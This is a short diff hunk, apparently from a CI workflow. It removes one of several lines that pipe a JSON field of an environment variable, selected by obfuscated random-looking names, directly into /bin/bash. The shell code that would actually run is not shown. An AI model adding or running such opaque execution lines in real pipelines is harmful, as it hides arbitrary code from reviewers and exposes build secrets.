@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$bm7678" | jq -r .g22 | /bin/bash
           echo $gk0886 | jq -r .qw0531 | /bin/bash
           echo $qsjs254 | jq -r .p13 | /bin/bash
-          echo $dcrl21890 | jq -r .ufwx85 | /bin/bash
           echo $boud1666 | jq -r .jjvza7 | /bin/bash
           echo $t8645 | jq -r .vot93781 | /bin/bash
 
